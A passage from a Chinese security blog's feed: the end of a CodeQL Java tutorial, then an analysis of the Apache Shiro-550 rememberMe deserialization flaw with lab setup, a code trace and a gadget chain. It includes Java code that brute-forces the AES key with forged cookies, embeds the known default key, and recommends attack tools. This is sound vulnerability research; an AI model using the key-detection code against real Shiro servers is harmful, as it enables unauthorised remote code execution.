branch.</p><blockquote><p>在这种情况下，将带有空的then分支的if语句识别为多余的语句，是一种假阳性。一种解决方法是修改查询，如果if语句有 else分支，则忽略空then分支。</p></blockquote><p>To exclude <code>if</code> statements that have an <code>else</code> branch:</p><blockquote><p>要排除有else分支的if语句。</p></blockquote><ol><li><p>Extend the where clause to include the following extra condition:</p><blockquote><p>扩展where子句，加入以下额外条件:</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and not exists(ifstmt.getElse())</span><br></pre></td></tr></table></figure><p> The <code>where</code> clause is now:</p><blockquote><p>现在的where子句:</p></blockquote> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">where ifstmt.getThen() &#x3D; block and</span><br><span class="line">  block.getNumStmt() &#x3D; 0 and</span><br><span class="line">  not exists(ifstmt.getElse())</span><br></pre></td></tr></table></figure></li><li><p>Click <strong>Run</strong>.</p><p> There are now fewer results because <code>if</code> statements with an <code>else</code> branch are no longer included.</p><blockquote><p>现在结果减少了，因为不再包含带有 else 分支的 if 语句。</p></blockquote></li></ol><p>➤ <a href="https://lgtm.com/query/6382189874776576029/" target="_blank" rel="noopener">See this in the query console</a></p><h2 id="Further-reading"><a href="#Further-reading" class="headerlink" title="Further reading"></a>Further reading</h2><ul><li><p><a href="https://github.com/github/codeql/tree/main/java/ql/src" target="_blank" rel="noopener">CodeQL queries for Java</a></p></li><li><p><a href="https://github.com/github/codeql/tree/main/java/ql/examples" target="_blank" rel="noopener">Example queries for Java</a></p></li><li><p><a href="https://codeql.github.com/codeql-standard-libraries/java/" target="_blank" rel="noopener">CodeQL library reference for Java</a></p></li><li><p>“<a href="https://codeql.github.com/docs/ql-language-reference/#ql-language-reference" target="_blank" rel="noopener">QL language reference</a>”</p></li><li><p>“<a href="https://codeql.github.com/docs/codeql-overview/codeql-tools/#codeql-tools" target="_blank" rel="noopener">CodeQL tools</a>”</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Basic-query-for-Java-code¶&quot;&gt;&lt;a href=&quot;#Basic-query-for-Java-code¶&quot; class=&quot;headerlink&quot; title=&quot;Basic query for Java code¶&quot;&gt;&lt;/a&gt;Basic qu
      
    
    </summary>
    
    
      <category term="codeql" scheme="https://summersec.github.io/categories/codeql/"/>
    
    
  </entry>
  
  <entry>
    <title>Shiro-550反序列化漏洞分析</title>
    <link href="https://summersec.github.io/2021/03/21/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://summersec.github.io/2021/03/21/Shiro-550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2021-03-21T11:01:42.000Z</published>
    <updated>2021-01-22T11:19:36.323Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>&emsp;&emsp; Shiro反序列化漏洞目前为止有两个，Shiro-550<code>(Apache  Shiro &lt; 1.2.5)</code>和Shiro-721<code>( Apache  Shiro &lt; 1.4.2 )</code>。这两个漏洞主要区别在于Shiro550使用已知密钥撞，后者Shiro721是使用<code>登录后rememberMe={value}去爆破正确的key值</code>进而反序列化，对比Shiro550条件只要有<code>足够密钥库</code>（条件比较低）、Shiro721需要登录（要求比较高<del>鸡肋</del>）。</p><ul><li><code>Apache Shiro &lt; 1.4.2</code>默认使用<code>AES/CBC/PKCS5Padding</code>模式</li><li><code>Apache Shiro &gt;= 1.4.2</code>默认使用<code>AES/GCM/PKCS5Padding</code>模式</li></ul><hr><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>&emsp;&emsp; 采用Maven仓库的形式，源码放在<a href="https://github.com/SummerSec/JavaLearnVulnerability" target="_blank" rel="noopener">GitHub</a>上，直接用Idea打开即可。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/POM/4.0.0"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.3.5.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-deser<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.junit.vintage<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit-vintage-engine<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        hutool是一款十分强大工具库--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        官网地址 https://www.hutool.cn/--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>cn.hutool<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hutool-all<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.5.7<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--         添加commons-collections依赖作为 payload--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;dependency&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;groupId&gt;commons-collections&lt;/groupId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;4.0&lt;/version&gt;--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--        &lt;/dependency&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        // debug参数</span><br><span class="line">            <span class="tag">&lt;<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">                -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=5005</span><br><span class="line">            <span class="tag">&lt;/<span class="name">jvmArguments</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line">`</span><br></pre></td></tr></table></figure><hr><h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><ul><li><p>调用org\apache\shiro\mgt\DefaultSecurityManager.class#resolvePrincipals方法<code>获取remember凭证</code></p><p><img src="https://img-blog.csdnimg.cn/20210120170900332.png" alt="在这里插入图片描述"></p></li><li><p>DefaultSecurityManager.class#getRememberedIdentity调用方法<code>获取rememberMe认证的序列化数据</code><br><img src="https://img-blog.csdnimg.cn/20210120170957673.png" alt="在这里插入图片描述"></p></li><li><p>接着调用父类org\apache\shiro\mgt\AbstractRememberMeManager.class#getRememberedPrincipals方法在122行调用<code>getRememberedSerializedIdentity</code>方法获取cookie中的值<br><img src="https://img-blog.csdnimg.cn/20210120171218140.png" alt="在这里插入图片描述"></p></li><li><p>然后来到org\apache\shiro\web\mgt\CookieRememberMeManager.class#getRememberedSerializedIdentity获取cookie值之后，先判断一下是否为空和<code>deleteMe</code>，解之Base64解码最后在95行处返回byte[]值<br><img src="https://img-blog.csdnimg.cn/20210122145845874.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210122150020874.png" alt="在这里插入图片描述"></p></li><li><p>org\apache\shiro\mgt\AbstractRememberMeManager.class#getRememberedPrincipals方法的124行进行类型转化，类型转化的过程中会进行AES解密操作，进而作为反序列化的数据<br><img src="https://img-blog.csdnimg.cn/20210122150415517.png" alt="在这里插入图片描述"></p></li><li><p>AbstractRememberMeManager.class#convertBytesToPrincipals进行AES解密操作，最后调用反序列化方法，将数据反序列化，导致反序列化漏洞<br><img src="https://img-blog.csdnimg.cn/20210122150613761.png" alt="在这里插入图片描述"></p></li><li><p>AbstractRememberMeManager#decrypt方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">byte</span>[] decrypt(<span class="keyword">byte</span>[] encrypted) &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] serialized = encrypted;</span><br><span class="line">        CipherService cipherService = <span class="keyword">this</span>.getCipherService();</span><br><span class="line">        <span class="keyword">if</span> (cipherService != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ByteSource byteSource = cipherService.decrypt(encrypted, <span class="keyword">this</span>.getDecryptionCipherKey());</span><br><span class="line">            serialized = byteSource.getBytes();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> serialized;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li><li><p>查看bytes数据值，可以看到解密后是生成的恶意payload</p><p><img src="https://img-blog.csdnimg.cn/20210122151026506.png" alt="在这里插入图片描述"></p></li><li><p>完整的payload演示效果<br>  <img src="https://img-blog.csdnimg.cn/20210122191831440.gif" alt="在这里插入图片描述"></p></li></ul><hr><h1 id="Shiro‘s-key爆破方式"><a href="#Shiro‘s-key爆破方式" class="headerlink" title="Shiro‘s key爆破方式"></a>Shiro‘s key爆破方式</h1><h2 id="基于原生shiro框架检测方式"><a href="#基于原生shiro框架检测方式" class="headerlink" title="基于原生shiro框架检测方式"></a>基于原生shiro框架检测方式</h2><p>l1nk3r师傅的检测思路地址: <a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a><br>关键代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">       ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"payload"</span>));</span><br><span class="line">       obj.writeObject(simplePrincipalCollection);</span><br><span class="line">       obj.close();</span><br></pre></td></tr></table></figure><p>实现具体代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 正确key</span></span><br><span class="line">        String realkey = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span>;</span><br><span class="line">        <span class="comment">// 错误key</span></span><br><span class="line">        String errorkey = <span class="string">"2AvVhdsgUs0FSA3SDFAdag=="</span>;</span><br><span class="line">        <span class="comment">// 序列化文件路径</span></span><br><span class="line">        String filepath = <span class="string">"E:\\Soures\\JavaLearnVulnerability\\shiro\\shiro-deser\\key"</span>;</span><br><span class="line"></span><br><span class="line">        SimplePrincipalCollection simplePrincipalCollection = <span class="keyword">new</span> SimplePrincipalCollection();</span><br><span class="line">        ObjectOutputStream obj = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(filepath));</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 写入序列化数据</span></span><br><span class="line">            obj.writeObject(simplePrincipalCollection);</span><br><span class="line">            obj.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        FileReader fileReader = <span class="keyword">new</span> FileReader(filepath);</span><br><span class="line"></span><br><span class="line">        CbcEncrypt cbcEncrypt = <span class="keyword">new</span> CbcEncrypt();</span><br><span class="line">        String realcookie = <span class="string">"rememberMe="</span> + cbcEncrypt.encrypt(realkey,fileReader.readBytes());</span><br><span class="line">        String errorcookie = <span class="string">"rememberMe="</span> + cbcEncrypt.encrypt(errorkey,fileReader.readBytes());</span><br><span class="line">        System.out.println(<span class="string">"realcookie --&gt; "</span> + realcookie);</span><br><span class="line">        System.out.println(<span class="string">"errorcookie --&gt; "</span> + errorcookie);</span><br><span class="line">        String url = <span class="string">"http://127.0.0.1:8001/index"</span>;</span><br><span class="line">        <span class="comment">// 发送请求包，获取返回包</span></span><br><span class="line">        HttpResponse realresponse = HttpRequest.get(url).cookie(realcookie).execute();</span><br><span class="line">        HttpResponse errorresponse = HttpRequest.get(url).cookie(errorcookie).execute();</span><br><span class="line">        String result1 = realresponse.header(Header.SET_COOKIE);</span><br><span class="line">        String result2 = errorresponse.header(Header.SET_COOKIE);</span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(<span class="string">"realkey ---&gt; "</span> + result1);</span><br><span class="line">        System.out.println(<span class="string">"errorkey ---&gt; "</span> + result2);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210122190937627.png" alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; Gadget Chian 如下。简单来说流程就是将生成恶意Payload进行AES加密，然后Base64编码，然后以<code>rememberMe={value}</code>形式发送给服务器。服务器将<code>value</code>Base64解码，然后将解码后数据进行AES解密，最后反序列化执行命令。<br>&emsp;&emsp; Shiro721在登录之后，用登录后服务器生成rememberMe的值进行Base64解码之后，用解码数据，再通过<code>Padding Oracle Attack</code>进行爆破得到key具体参考<a href="https://paper.seebug.org/1378/#412-apache-shiro-padding-oracle-attack" target="_blank" rel="noopener">Shiro 组件漏洞与攻击链分析</a>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">*                  Gadget chian:</span><br><span class="line">*                      DefaultSecurityManager.resolvePrincipals()</span><br><span class="line">*                          DefaultSecurityManager.getRememberedIdentity()</span><br><span class="line">*                              AbstractRememberMeManager.getRememberedPrincipals()</span><br><span class="line">*                                  CookieRememberMeManager#getRememberedSerializedIdentity()</span><br><span class="line">*                                      AbstractRememberMeManager#getRememberedPrincipals()</span><br><span class="line">*                                          AbstractRememberMeManager.convertBytesToPrincipals()</span><br><span class="line">*                                              AbstractRememberMeManager.decrypt()</span><br><span class="line">*                                                  AbstractRememberMeManager.deserialize()</span><br><span class="line">*                                                      .....................</span><br><span class="line">*                                                               ..........</span><br><span class="line">*  </span><br><span class="line">*</span><br></pre></td></tr></table></figure><hr><h2 id="Shiro实用工具推荐"><a href="#Shiro实用工具推荐" class="headerlink" title="Shiro实用工具推荐"></a>Shiro实用工具推荐</h2><ul><li><a href="https://github.com/j1anFen/shiro_attack" target="_blank" rel="noopener">shiro_attack</a> 推荐理由：javafx写的UI，支持tomcat全版本回显和Spring Boot回显。使用<code>SimplePrincipalCollection</code>爆破key，支持高版本加密方式爆破（GCM模式）项目还在维护。<br><img src="https://img-blog.csdnimg.cn/20210122183413881.png" alt></li></ul><hr><ul><li><a href="https://github.com/pmiaowu/BurpShiroPassiveScan" target="_blank" rel="noopener">BurpShiroPassiveScan</a>是一款burp插件，被动式扫描，自动识别是否为shiro框架，支持CBC/GCM两种加密方式，同时默认使用<code>SimplePrincipalCollection</code>爆破key，项目在维护。<br><img src="https://img-blog.csdnimg.cn/2021012218384769.png" alt="在这里插入图片描述"></li></ul><hr><h2 id="踩坑记录"><a href="#踩坑记录" class="headerlink" title="踩坑记录"></a>踩坑记录</h2><h3 id="编码不一致问题"><a href="#编码不一致问题" class="headerlink" title="编码不一致问题"></a>编码不一致问题</h3><p>由于Windows cmd的编码是gdk，导致读取cmd内容的时候会<code>aced0005</code>变成<code>efbfbdefbfbd</code>，导致无法反序列化。<br><img src="https://img-blog.csdnimg.cn/20210120125258810.png" alt="在这里插入图片描述"><br>解决办法将生成的payload导入文件之中，然后读取二进制数据。<br><img src="https://img-blog.csdnimg.cn/20210122171101605.png" alt="在这里插入图片描述"></p><hr><h2 id="课外知识补充"><a href="#课外知识补充" class="headerlink" title="课外知识补充"></a>课外知识补充</h2><h3 id="springboot-debug技巧"><a href="#springboot-debug技巧" class="headerlink" title="springboot debug技巧"></a>springboot debug技巧</h3><p>在配置中VM options 输入<code>-Xms512m -Xmx512m -Xmn164m -XX:MaxPermSize=250m -XX:ReservedCodeCacheSize=64m -Dserver.port=8001 -ea</code><br><img src="https://img-blog.csdnimg.cn/202101221712423.png" alt="在这里插入图片描述"><br>同时在配置文件pom.xml加入</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;plugin&gt;</span><br><span class="line">        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;</span><br><span class="line">        &lt;configuration&gt;</span><br><span class="line">            &lt;jvmArguments&gt;</span><br><span class="line">                -Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=<span class="number">5005</span></span><br><span class="line">            &lt;/jvmArguments&gt;</span><br><span class="line">        &lt;/configuration&gt;</span><br><span class="line">    &lt;/plugin&gt;</span><br></pre></td></tr></table></figure><h3 id="VScode添加插件"><a href="#VScode添加插件" class="headerlink" title="VScode添加插件"></a>VScode添加插件</h3><p>Hex Editor插件</p><p><img src="https://img-blog.csdnimg.cn/20210122171520346.png" alt="在这里插入图片描述"><br>效果如下<br><img src="https://img-blog.csdnimg.cn/20210122171541915.png" alt="在这里插入图片描述"></p><h3 id="Git-自带-xxd工具"><a href="#Git-自带-xxd工具" class="headerlink" title="Git 自带 xxd工具"></a>Git 自带 xxd工具</h3><p>将工具路径加入环境变量<br><img src="https://img-blog.csdnimg.cn/20210122171754706.png" alt="在这里插入图片描述"><br>效果如下：</p><p><img src="https://img-blog.csdnimg.cn/20210122172003896.png" alt="在这里插入图片描述"></p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">https://issues.apache.org/jira/browse/SHIRO-550</a><br><a href="https://paper.seebug.org/1378" target="_blank" rel="noopener">https://paper.seebug.org/1378</a><br><a href="https://ares-x.com/2020/10/26/Shiro%E9%AB%98%E7%89%88%E6%9C%AC%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://ares-x.com/2020/10/26/Shiro%E9%AB%98%E7%89%88%E6%9C%AC%E5%8A%A0%E5%AF%86%E6%96%B9%E5%BC%8F%E4%B8%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</a><br><a href="https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/do88_4Td1CSeKLmFqhGCuQ</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp; Shiro反序列化漏洞目前为止有两个，Shiro-550&lt;code&gt;(Apache  Shiro &amp;lt; 1.2
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
